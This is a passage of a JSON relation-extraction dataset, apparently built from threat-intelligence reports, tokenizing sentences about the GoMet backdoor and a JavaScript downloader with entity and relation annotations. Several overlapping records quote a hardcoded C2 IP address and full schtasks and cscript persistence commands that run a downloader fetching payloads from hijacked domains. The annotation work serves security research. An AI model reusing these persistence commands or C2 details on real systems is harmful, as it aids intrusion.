"pos": [45, 46], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [146, 146], "name": "fake Windows update", "pos": [7, 10], "index": "10_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [154, 154], "name": "GoMet dropper", "pos": [15, 17], "index": "11_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [176, 176], "name": "goodware", "pos": [19, 20], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [181, 181], "name": "malware", "pos": [24, 25], "index": "13_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [194, 194], "name": "schtask query", "pos": [11, 13], "index": "14_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [201, 201], "name": "CMD process", "pos": [18, 20], "index": "15_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [209, 209], "name": "systeminfo", "pos": [26, 27], "index": "16_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [211, 211], "name": "schtask queries", "pos": [28, 30], "index": "17_0"}]], "labels": [{"r": "WR", "evidence": [0, 1], "t": 0, "h": 1}, {"r": "RD", "evidence": [1], "h": 1, "t": 2}, {"r": "WR", "evidence": [1], "h": 1, "t": 2}, {"r": "EX", "evidence": [3], "h": 3, "t": 4}, {"r": "FR", "evidence": [3], "h": 3, "t": 5}, {"r": "WR", "evidence": [3, 4], "h": 5, "t": 6}, {"r": "IJ", "evidence": [3, 4, 5, 6], "h": 3, "t": 12}, {"r": "WR", "evidence": [4], "t": 6, "h": 7}, {"r": "WR", "evidence": [4], "t": 6, "h": 7}, {"r": "WR", "evidence": [4], "t": 6, "h": 8}, {"r": "FR", "evidence": [4, 5, 6], "h": 8, "t": 12}, {"r": "CO", "evidence": [4], "h": 7, "t": 9}, {"r": "WR", "evidence": [5], "t": 10, "h": 11}, {"r": "FR", "evidence": [5, 6, 7], "h": 11, "t": 14}, {"r": "CO", "evidence": [5, 6], "h": 11, "t": 13}, {"r": "UK", "evidence": [6], "t": 12, "h": 13}, {"r": "FR", "evidence": [6, 7], "h": 13, "t": 15}, {"r": "FR", "evidence": [7], "h": 15, "t": 16}, {"r": "FR", "evidence": [7], "h": 15, "t": 17}]}, {"title": "065-9", "sents": [["The", "trick", "is", ",", "the", "Go", "compiler", "is", "changing", "the", "source", "code", "WaitGroup", "."], ["Done", "(", ")", "to", "WaitGroup.Add", "(", "-1", ")", "."], ["After", "the", "Agent.start", "routine", "is", "done", ",", "the", "next", "cron", "job", "triggered", "the", "execution", "of", "the", "serve", "(", ")", "routine", "and", "tried", "to", "start", "another", "instance", "of", "the", "Agent", "."], ["The", "simplified", "source", "code", "of", "the", "GitHub", "version", "looks", "like", "this", ":", "The", "simplified", "pseudo-code", "for", "the", "samples", "in", "the", "wild", "looks", "like", "this", ":", "Talos", "found", "two", "samples", "of", "this", "version", "of", "the", "backdoor", ":", "f24158c5132943fbdeee4de4cedd", "(", "FctSec.exe", ")", "950ba2cc9b1dfaadf6919e05c854c", "(", "SQLocalM86.exe", ")", "These", "samples", "have", "minor", "differences", "but", "are", "likely", "built", "from", "the", "same", "source", "code", ",", "just", "with", "a", "slightly", "different", "configuration", "."], ["The", "malicious", "activity", "we", "detected", "included", "a", "fake", "Windows", "update", "scheduled", "tasks", "created", "by", "the", "GoMet", "dropper", "."], ["It", "enumerated", "the", "autorun", "values", "and", ",", "instead", "of", "creating", "a", "new", "one", ",", "replaced", "one", "of", "the", "existing", "goodware", "autorun", "executables", "with", "the", "malware", "."], ["In", "one", "of", "the", "cases", ",", "about", "60", "seconds", "before", "the", "schtask", "query", "is", "executed", ",", "a", "blank", "CMD", "process", "is", "opened", "and", "then", "subsequently", "executes", "systeminfo", "and", "schtask", "queries", "rather", "than", "these", "queries", "being", "chain", "opened", "by", "svchost", "or", "services", "or", "another", "process", "."], ["This", "execution", "looks", "like", ":", "C", ":", "\\WINDOWS\\system32\\cmd.exe", "7", ")", "systeminfoschtasks", "/query", "/tn", "microsoft\\windows\\windowsupdate\\scheduledschtasks", "/query", "/tn", "microsoft\\windows\\windowsupdate\\scheduled", "/vInfrastructure", "Both", "samples", "have", "the", "command", "and", "control", "(", "C2", ")", "IP", "address", "hardcoded", ",", "which", "is", "111.90.139.122", "."]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [5, 5], "name": "Go compiler", "pos": [5, 7], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [10, 10], "name": "source code", "pos": [10, 12], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [32, 32], "name": "cron job", "pos": [9, 11], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [39, 39], "name": "serve ( ) routine", "pos": [16, 20], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [51, 51], "name": "Agent", "pos": [28, 29], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [67, 67], "name": "pseudo-code", "pos": [14, 15], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [81, 81], "name": "samples", "pos": [28, 29], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [87, 87], "name": "backdoor", "pos": [34, 35], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [98, 98], "name": "samples", "pos": [45, 46], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [126, 126], "name": "fake Windows update", "pos": [7, 10], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [134, 134], "name": "GoMet dropper", "pos": [15, 17], "index": "10_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [156, 156], "name": "goodware", "pos": [19, 20], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [161, 161], "name": "malware", "pos": [24, 25], "index": "12_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [174, 174], "name": "schtask query", "pos": [11, 13], "index": "13_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [181, 181], "name": "CMD process", "pos": [18, 20], "index": "14_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [189, 189], "name": "systeminfo", "pos": [26, 27], "index": "15_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [191, 191], "name": "schtask queries", "pos": [28, 30], "index": "16_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "EX", "evidence": [2], "h": 2, "t": 3}, {"r": "FR", "evidence": [2], "h": 2, "t": 4}, {"r": "WR", "evidence": [2, 3], "h": 4, "t": 5}, {"r": "IJ", "evidence": [2, 3, 4, 5], "h": 2, "t": 11}, {"r": "WR", "evidence": [3], "t": 5, "h": 6}, {"r": "WR", "evidence": [3], "t": 5, "h": 6}, {"r": "WR", "evidence": [3], "t": 5, "h": 7}, {"r": "FR", "evidence": [3, 4, 5], "h": 7, "t": 11}, {"r": "CO", "evidence": [3], "h": 6, "t": 8}, {"r": "WR", "evidence": [4], "t": 9, "h": 10}, {"r": "FR", "evidence": [4, 5, 6], "h": 10, "t": 13}, {"r": "CO", "evidence": [4, 5], "h": 10, "t": 12}, {"r": "UK", "evidence": [5], "t": 11, "h": 12}, {"r": "FR", "evidence": [5, 6], "h": 12, "t": 14}, {"r": "FR", "evidence": [6], "h": 14, "t": 15}, {"r": "FR", "evidence": [6], "h": 14, "t": 16}]}, {"title": "065-10", "sents": [["Done", "(", ")", "to", "WaitGroup.Add", "(", "-1", ")", "."], ["After", "the", "Agent.start", "routine", "is", "done", ",", "the", "next", "cron", "job", "triggered", "the", "execution", "of", "the", "serve", "(", ")", "routine", "and", "tried", "to", "start", "another", "instance", "of", "the", "Agent", "."], ["The", "simplified", "source", "code", "of", "the", "GitHub", "version", "looks", "like", "this", ":", "The", "simplified", "pseudo-code", "for", "the", "samples", "in", "the", "wild", "looks", "like", "this", ":", "Talos", "found", "two", "samples", "of", "this", "version", "of", "the", "backdoor", ":", "f24158c5132943fbdeee4de4cedd", "(", "FctSec.exe", ")", "950ba2cc9b1dfaadf6919e05c854c", "(", "SQLocalM86.exe", ")", "These", "samples", "have", "minor", "differences", "but", "are", "likely", "built", "from", "the", "same", "source", "code", ",", "just", "with", "a", "slightly", "different", "configuration", "."], ["The", "malicious", "activity", "we", "detected", "included", "a", "fake", "Windows", "update", "scheduled", "tasks", "created", "by", "the", "GoMet", "dropper", "."], ["It", "enumerated", "the", "autorun", "values", "and", ",", "instead", "of", "creating", "a", "new", "one", ",", "replaced", "one", "of", "the", "existing", "goodware", "autorun", "executables", "with", "the", "malware", "."], ["In", "one", "of", "the", "cases", ",", "about", "60", "seconds", "before", "the", "schtask", "query", "is", "executed", ",", "a", "blank", "CMD", "process", "is", "opened", "and", "then", "subsequently", "executes", "systeminfo", "and", "schtask", "queries", "rather", "than", "these", "queries", "being", "chain", "opened", "by", "svchost", "or", "services", "or", "another", "process", "."], ["This", "execution", "looks", "like", ":", "C", ":", "\\WINDOWS\\system32\\cmd.exe", "7", ")", "systeminfoschtasks", "/query", "/tn", "microsoft\\windows\\windowsupdate\\scheduledschtasks", "/query", "/tn", "microsoft\\windows\\windowsupdate\\scheduled", "/vInfrastructure", "Both", "samples", "have", "the", "command", "and", "control", "(", "C2", ")", "IP", "address", "hardcoded", ",", "which", "is", "111.90.139.122", "."], ["Communication", "occurs", "via", "HTTPS", "on", "the", "default", "port", "."]], "vertexSet": [[{"type": "MP", "sent_id": 1, "global_pos": [18, 18], "name": "cron job", "pos": [9, 11], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [25, 25], "name": "serve ( ) routine", "pos": [16, 20], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [37, 37], "name": "Agent", "pos": [28, 29], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [53, 53], "name": "pseudo-code", "pos": [14, 15], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [67, 67], "name": "samples", "pos": [28, 29], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [73, 73], "name": "backdoor", "pos": [34, 35], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [84, 84], "name": "samples", "pos": [45, 46], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [112, 112], "name": "fake Windows update", "pos": [7, 10], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [120, 120], "name": "GoMet dropper", "pos": [15, 17], "index": "8_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [142, 142], "name": "goodware", "pos": [19, 20], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [147, 147], "name": "malware", "pos": [24, 25], "index": "10_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [160, 160], "name": "schtask query", "pos": [11, 13], "index": "11_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [167, 167], "name": "CMD process", "pos": [18, 20], "index": "12_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [175, 175], "name": "systeminfo", "pos": [26, 27], "index": "13_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [177, 177], "name": "schtask queries", "pos": [28, 30], "index": "14_0"}]], "labels": [{"r": "EX", "evidence": [1], "h": 0, "t": 1}, {"r": "FR", "evidence": [1], "h": 0, "t": 2}, {"r": "WR", "evidence": [1, 2], "h": 2, "t": 3}, {"r": "IJ", "evidence": [1, 2, 3, 4], "h": 0, "t": 9}, {"r": "WR", "evidence": [2], "t": 3, "h": 4}, {"r": "WR", "evidence": [2], "t": 3, "h": 4}, {"r": "WR", "evidence": [2], "t": 3, "h": 5}, {"r": "FR", "evidence": [2, 3, 4], "h": 5, "t": 9}, {"r": "CO", "evidence": [2], "h": 4, "t": 6}, {"r": "WR", "evidence": [3], "t": 7, "h": 8}, {"r": "FR", "evidence": [3, 4, 5], "h": 8, "t": 11}, {"r": "CO", "evidence": [3, 4], "h": 8, "t": 10}, {"r": "UK", "evidence": [4], "t": 9, "h": 10}, {"r": "FR", "evidence": [4, 5], "h": 10, "t": 12}, {"r": "FR", "evidence": [5], "h": 12, "t": 13}, {"r": "FR", "evidence": [5], "h": 12, "t": 14}]}, {"title": "095-0", "sents": [["Infection", "chainVictims", "of", "this", "malware", "are", "typically", "infected", "via", "a", "dropper", "."], ["Once", "infected", ",", "a", "victim", "machine", "will", "create", "a", "scheduled", "task", "."], ["This", "task", "will", "execute", "a", "JavaScript", "downloader", "that", "makes", "a", "request", "to", "one", "of", "several", "hijacked", "domains", "."], ["The", "command", "line", "string", "that", "create", "this", "task", "is", ":", "C", ":", "\\Windows\\system32\\schtasks.exe", "/create", "/tn", "{", "guid", "}", "/tr", "cmd.exe", "/C", "``", "start", "/MIN", "C", ":", "\\Windows\\system32\\cscript.exe", "/E", ":", "javascript", "``", "C", ":", "\\Users\\USERNAME\\ymwoyf.wpl", "''", "/sc", "WEEKLY", "/D", "TUE", ",", "WED", ",", "THU", "/ST", "12:00:00", "/FThis", "downloader", "is", "executed", "using", "the", "command", ":", "cmd.exe", "/C", "start", "/MIN", "C", ":", "\\Windows\\system32\\cscript.exe", "/E", ":", "javascript", "C", ":", "\\ProgramData\\\\puigje.wpl", "''", "C", ":", "\\Windows\\system32\\cscript.exe", "/E", ":", "javascript", "C", ":", "\\ProgramData\\puigje.wplCisco", "Talos", "first", "observed", "a", "spike", "in", "requests", "to", "thes"], ["Additionally", ",", "the", "comment", "string", "``", "CHANGES", "15", "."], ["This", "downloader", "always", "requests", "the", "URL", "``", "/datacollectionservice.php3", ".", "``", "from", "these", "hijacked", "domains", "."], ["The", "domains", "used", "by", "the", "downloader", "for", "this", "request", "are", "XOR", "encrypted", "at", "the", "beginning", "of", "the", "JavaScript", "."], ["The", "response", "to", "this", "request", "is", "obfuscated", "data", "that", "will", "be", "saved", "as", "(", "randalpha", ")", "_1.zzz", "and", "(", "randalpha", ")", "_2.zzz", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [4, 4], "name": "malware", "pos": [4, 5], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [10, 10], "name": "dropper", "pos": [10, 11], "index": "1_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [16, 16], "name": "victim machine", "pos": [4, 6], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [25, 25], "name": "task", "pos": [1, 2], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [29, 29], "name": "JavaScript downloader", "pos": [5, 7], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [49, 49], "name": "task", "pos": [7, 8], "index": "5_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [52, 52], "name": "C : \\Windows\\system32\\schtasks.exe", "pos": [10, 13], "index": "6_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [66, 66], "name": "C : \\Windows\\system32\\cscript.exe", "pos": [24, 27], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [88, 88], "name": "downloader", "pos": [46, 47], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [137, 137], "name": "downloader", "pos": [1, 2], "index": "9_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [141, 141], "name": "URL", "pos": [5, 6], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [143, 143], "name": "/datacollectionservice.php3", "pos": [7, 8], "index": "11_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [156, 156], "name": "downloader", "pos": [5, 6], "index": "12_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [168, 168], "name": "JavaScript", "pos": [17, 18], "index": "13_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [186, 186], "name": "_1.zzz", "pos": [16, 17], "index": "14_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [191, 191], "name": "_2.zzz", "pos": [21, 22], "index": "15_0"}]], "labels": [{"r": "WR", "evidence": [0, 1], "t": 0, "h": 2}, {"r": "WR", "evidence": [0, 1], "t": 1, "h": 2}, {"r": "EX", "evidence": [0, 1], "t": 1, "h": 2}, {"r": "FR", "evidence": [1, 2], "h": 2, "t": 3}, {"r": "FR", "evidence": [2, 3], "h": 3, "t": 6}, {"r": "WR", "evidence": [2, 3], "t": 4, "h": 5}, {"r": "FR", "evidence": [3], "h": 6, "t": 7}, {"r": "FR", "evidence": [3], "h": 7, "t": 8}, {"r": "EX", "evidence": [2, 3], "t": 4, "h": 8}, {"r": "CO", "evidence": [3, 4, 5], "h": 8, "t": 9}, {"r": "CO", "evidence": [3, 4, 5, 6], "h": 8, "t": 12}, {"r": "EX", "evidence": [5], "h": 9, "t": 11}, {"r": "ST", "evidence": [5, 6], "t": 10, "h": 12}, {"r": "RF", "evidence": [5, 6], "t": 10, "h": 12}, {"r": "WR", "evidence": [6], "h": 12, "t": 13}, {"r": "EX", "evidence": [6], "h": 12, "t": 13}, {"r": "WR", "evidence": [6, 7], "h": 12, "t": 14}, {"r": "RD", "evidence": [6, 7], "h": 12, "t": 15}]}, {"title": "095-1", "sents": [["Once", "infected", ",", "a", "victim", "machine", "will", "create", "a", "scheduled", "task", "."], ["This", "task", "will", "execute", "a", "JavaScript", "downloader", "that", "makes", "a", "request", "to", "one", "of", "several", "hijacked", "domains", "."], ["The", "command", "line", "string", "that", "create", "this", "task", "is", ":", "C", ":", "\\Windows\\system32\\schtasks.exe", "/create", "/tn", "{", "guid", "}", "/tr", "cmd.exe", "/C", "``", "start", "/MIN", "C", ":", "\\Windows\\system32\\cscript.exe", "/E", ":", "javascript", "``", "C", ":", "\\Users\\USERNAME\\ymwoyf.wpl", "''", "/sc", "WEEKLY", "/D", "TUE", ",", "WED", ",", "THU", "/ST", "12:00:00", "/FThis", "downloader", "is", "executed", "using", "the", "command", ":", "cmd.exe", "/C", "start", "/MIN", "C", ":", "\\Windows\\system32\\cscript.exe", "/E", ":", "javascript", "C", ":", "\\ProgramData\\\\puigje.wpl", "''", "C", ":", "\\Windows\\system32\\cscript.exe", "/E", ":", "javascript", "C", ":", "\\ProgramData\\puigje.wplCisco", "Talos", "first", "observed", "a", "spike", "in", "requests", "to", "thes"], ["Additionally", ",", "the", "comment", "string", "``", "CHANGES", "15", "."], ["This", "downloader", "always", "requests", "the", "URL", "``", "/datacollectionservice.php3", ".", "``", "from", "these", "hijacked", "domains", "."], ["The", "domains", "used", "by", "the", "downloader", "for", "this", "request", "are", "XOR", "encrypted", "at", "the", "beginning", "of", "the", "JavaScript", "."], ["The", "response", "to", "this", "request", "is", "obfuscated", "data", "that", "will", "be", "saved", "as", "(", "randalpha", ")", "_1.zzz", "and", "(", "randalpha", ")", "_2.zzz", "."], ["The", "first", "1,000", "bytes", "of", "data", "are", "saved", "to", "the", "first", ".zzz", "file", ",", "while", "the", "remainder", "goes", "to", "the", "second", "file", "."]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [4, 4], "name": "victim machine", "pos": [4, 6], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [13, 13], "name": "task", "pos": [1, 2], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [17, 17], "name": "JavaScript downloader", "pos": [5, 7], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [37, 37], "name": "task", "pos": [7, 8], "index": "3_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [40, 40], "name": "C : \\Windows\\system32\\schtasks.exe", "pos": [10, 13], "index": "4_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [54, 54], "name": "C : \\Windows\\system32\\cscript.exe", "pos": [24, 27], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [76, 76], "name": "downloader", "pos": [46, 47], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [125, 125], "name": "downloader", "pos": [1, 2], "index": "7_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [129, 129], "name": "URL", "pos": [5, 6], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [131, 131], "name": "/datacollectionservice.php3", "pos": [7, 8], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [144, 144], "name": "downloader", "pos": [5, 6], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [156, 156], "name": "JavaScript", "pos": [17, 18], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [174, 174], "name": "_1.zzz", "pos": [16, 17], "index": "12_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [179, 179], "name": "_2.zzz", "pos": [21, 22], "index": "13_0"}]], "labels": [{"r": "FR", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "FR", "evidence": [1, 2], "h": 1, "t": 4}, {"r": "WR", "evidence": [1, 2], "t": 2, "h": 3}, {"r": "FR", "evidence": [2], "h": 4, "t": 5}, {"r": "FR", "evidence": [2], "h": 5, "t": 6}, {"r": "EX", "evidence": [1, 2], "t": 2, "h": 6}, {"r": "CO", "evidence": [2, 3, 4], "h": 6, "t": 7}, {"r": "CO", "evidence": [2, 3, 4, 5], "h": 6, "t": 10}, {"r": "EX", "evidence": [4], "h": 7, "t": 9}, {"r": "ST", "evidence": [4, 5], "t": 8, "h": 10}, {"r": "RF", "evidence": [4, 5], "t": 8, "h": 10}, {"r": "WR", "evidence": [5], "h": 10, "t": 11}, {"r": "EX", "evidence": [5], "h": 10, "t": 11}, {"r": "WR", "evidence": [5, 6], "h": 10, "t": 12}, {"r": "RD", "evidence": [5, 6], "h": 10, "t": 13}]}, {"title": "095-2", "sents": [["This", "task", "will", "execute", "a", "JavaScript", "downloader", "that", "makes", "a", "request", "to", "one", "of", "several", "hijacked", "domains", "."], ["The", "command", "line", "string", "that", "create", "this", "task", "is", ":", "C", ":", "\\Windows\\system32\\schtasks.exe", "/create", "/tn", "{", "guid", "}", "/tr", "cmd.exe", "/C", "``", "start", "/MIN", "C", ":", "\\Windows\\system32\\cscript.exe", "/E", ":", "javascript", "``", "C", ":", "\\Users\\USERNAME\\ymwoyf.wpl", "''", "/sc", "WEEKLY", "/D", "TUE", ",", "WED", ",", "THU", "/ST", "12:00:00", "/FThis", "downloader", "is", "executed", "using", "the", "command", ":", "cmd.exe", "/C", "start", "/MIN", "C", ":", "\\Windows\\system32\\cscript.exe", "/E", ":", "javascript", "C", ":", "\\ProgramData\\\\puigje.wpl", "''", "C", ":", "\\Windows\\system32\\cscript.exe", "/E", ":", "javascript", "C", ":", "\\ProgramData\\puigje.wplCisco", "Talos", "first", "observed", "a", "spike", "in", "requests", "to", "thes"], ["Additionally", ",", "the", "comment", "string", "``", "CHANGES", "15", "."], ["This", "downloader", "always", "requests", "the", "URL", "``", "/datacollectionservice.php3", ".", "``", "from", "these", "hijacked", "domains", "."], ["The", "domains", "used", "by", "the", "downloader", "for", "this", "request", "are", "XOR", "encrypted", "at", "the", "beginning", "of", "the", "JavaScript", "."], ["The", "response", "to", "this", "request", "is", "obfuscated", "data", "that", "will", "be", "saved", "as", "(", "randalpha", ")", "_1.zzz", "and", "(", "randalpha", ")", "_2.zzz", "."], ["The", "first", "1,000", "bytes", "of", "data", "are", "saved", "to", "the", "first", ".zzz", "file", ",", "while", "the", "remainder", "goes", "to", "the", "second", "file", "."], ["The", "data", "in", "these", "files", "is", "decrypted", "with", "the", "code", "contained", "in", "the", "JavaScript", "downloader", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "task", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "JavaScript downloader", "pos": [5, 7], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [25, 25], "name": "task", "pos": [7, 8], "index": "2_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [28, 28], "name": "C : \\Windows\\system32\\schtasks.exe", "pos": [10, 13], "index": "3_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [42, 42], "name": "C : \\Windows\\system32\\cscript.exe", "pos": [24, 27], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [64, 64], "name": "downloader", "pos": [46, 47], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [113, 113], "name": "downloader", "pos": [1, 2], "index": "6_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [117, 117], "name": "URL", "pos": [5, 6], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [119, 119], "name": "/datacollectionservice.php3", "pos": [7, 8], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [132, 132], "name": "downloader", "pos": [5, 6], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [144, 144], "name": "JavaScript", "pos": [17, 18], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [162, 162], "name": "_1.zzz", "pos": [16, 17], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [167, 167], "name": "_2.zzz", "pos": [21, 22], "index": "12_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [201, 201], "name": "code", "pos": [9, 10], "index": "13_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [205, 205], "name": "JavaScript downloader", "pos": [13, 15], "index": "14_0"}]], "labels": [{"r": "FR", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "WR", "evidence": [0, 1], "t": 1, "h": 2}, {"r": "FR", "evidence": [1], "h": 3, "t": 4}, {"r": "FR", "evidence": [1], "h": 4, "t": 5}, {"r": "EX", "evidence": [0, 1], "t": 1, "h": 5}, {"r": "CO", "evidence": [1, 2, 3], "h": 5, "t": 6}, {"r": "CO", "evidence": [1, 2, 3, 4], "h": 5, "t": 9}, {"r": "EX", "evidence": [3], "h": 6, "t": 8}, {"r": "ST", "evidence": [3, 4], "t": 7, "h": 9}, {"r": "RF", "evidence": [3, 4], "t": 7, "h": 9}, {"r": "WR", "evidence": [4], "h": 9, "t": 10}, {"r": "EX", "evidence": [4], "h": 9, "t": 10}, {"r": "WR", "evidence": [4, 5], "h": 9, "t": 11}, {"r": "RD", "evidence": [4, 5], "h": 9, "t": 12}, {"r": "EX", "evidence": [7], "t": 13, "h": 14}]}, {"title": "095-3", "sents": [["The", "command", "line", "string", "that", "create", "this", "task", "is", ":", "C", ":", "\\Windows\\system32\\schtasks.exe", "/create", "/tn", "{", "guid", "}", "/tr", "cmd.exe", "/C", "``", "start", "/MIN", "C", ":", "\\Windows\\system32\\cscript.exe", "/E", ":", "javascript", "``", "C", ":", "\\Users\\USERNAME\\ymwoyf.wpl", "''", "/sc", "WEEKLY", "/D", "TUE", ",", "WED", ",", "THU", "/ST", "12:00:00", "/FThis", "downloader", "is", "executed", "using", "the", "command", ":", "cmd.exe", "/C", "start", "/MIN", "C", ":", "\\Windows\\system32\\cscript.exe", "/E", ":", "javascript", "C", ":", "\\ProgramData\\\\puigje.wpl", "''", "C", ":", "\\Windows\\system32\\cscript.exe", "/E", ":", "javascript", "C", ":", "\\ProgramData\\puigje.wplCisco", "Talos", "first", "observed", "a", "spike", "in", "requests", "to", "thes"], ["Additionally", ",", "the", "comment", "string", "``", "CHANGES", "15", "."], ["This", "downloader", "always", "requests", "the", "URL", "``", "/datacollectionservice.php3", ".", "``", "from", "these", "hijacked", "domains", "."], ["The", "domains", "used", "by", "the", "downloader", "for", "this", "request", "are", "XOR", "encrypted", "at", "the", "beginning", "of", "the", "JavaScript", "."], ["The", "response", "to", "this", "request", "is", "obfuscated", "data", "that", "will", "be", "saved", "as", "(", "randalpha", ")", "_1.zzz", "and", "(", "randalpha", ")", "_2.zzz", "."], ["The", "first", "1,000", "bytes", "of", "data", "are", "saved", "to", "the", "first", ".zzz", "file", ",", "while", "the", "remainder", "goes", "to", "the", "second", "file", "."], ["The", "data", "in", "these", "files", "is", "decrypted", "with", "the", "code", "contained", "in", "the", "JavaScript", "downloader", "."], ["Additionally", ",", "a", "scheduled", "task", "is", "created", "to", "execute", "a", "batch", "file", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [7, 7], "name": "task", "pos": [7, 8], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [10, 10], "name": "C : \\Windows\\system32\\schtasks.exe", "pos": [10, 13], "index": "1_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [24, 24], "name": "C : \\Windows\\system32\\cscript.exe", "pos": [24, 27], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [46, 46], "name": "downloader", "pos": [46, 47], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [95, 95], "name": "downloader", "pos": [1, 2], "index": "4_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [99, 99], "name": "URL", "pos": [5, 6], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [101, 101], "name": "/datacollectionservice.php3", "pos": [7, 8], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [114, 114], "name": "downloader", "pos": [5, 6], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [126, 126], "name": "JavaScript", "pos": [17, 18], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [144, 144], "name": "_1.zzz", "pos": [16, 17], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [149, 149], "name": "_2.zzz", "pos": [21, 22], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [183, 183], "name": "code", "pos": [9, 10], "index": "11_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [187, 187], "name": "JavaScript downloader", "pos": [13, 15], "index": "12_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [193, 193], "name": "scheduled task", "pos": [3, 5], "index": "13_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [200, 200], "name": "batch file", "pos": [10, 12], "index": "14_0"}]], "labels": [{"r": "FR", 